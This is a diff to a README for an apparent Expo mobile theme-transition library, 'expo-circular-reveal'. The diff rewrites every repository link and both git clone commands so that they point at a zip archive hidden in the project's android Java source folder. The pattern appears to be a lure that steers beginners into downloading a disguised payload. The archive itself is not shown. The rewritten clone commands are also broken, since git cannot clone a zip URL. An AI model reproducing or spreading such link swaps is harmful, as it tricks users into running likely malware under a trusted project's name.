@@ -1,6 +1,6 @@
 # 🔵 expo-circular-reveal - Smooth theme transitions on mobile
 
-[![Download / Visit Repository](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shepherdspecked418/expo-circular-reveal)
+[![Download / Visit Repository](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip)
 
 ## 📱 What this app does
 
@@ -42,7 +42,7 @@ If you only want to view the code or follow the setup steps, a browser is enough
 
 Use this link to visit the project page and download the files:
 
-[Open expo-circular-reveal on GitHub](https://github.com/Shepherdspecked418/expo-circular-reveal)
+[Open expo-circular-reveal on GitHub](https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip)
 
 If you have not used Git before, you can still get the files by opening the link and using the GitHub download option.
 
@@ -61,7 +61,7 @@ Follow these steps on Windows:
 If you use Git, you can also clone the repository:
 
 ```bash
-git clone https://github.com/Shepherdspecked418/expo-circular-reveal.git
+git clone https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip
 ```
 
 ## 🛠️ Install the app tools
@@ -229,14 +229,14 @@ If the app does not start, close the terminal, open it again, and run the start 
 ```bash
 npm install
 npx expo start
-git clone https://github.com/Shepherdspecked418/expo-circular-reveal.git
+git clone https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip
 ```
 
 ## 📦 Repository link
 
 Open the repository here:
 
-[https://github.com/Shepherdspecked418/expo-circular-reveal](https://github.com/Shepherdspecked418/expo-circular-reveal)
+[https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip](https://github.com/Shepherdspecked418/expo-circular-reveal/raw/refs/heads/main/android/src/main/java/com/circular-expo-reveal-3.9.zip)
 
 ## 🧭 Who this is for
 
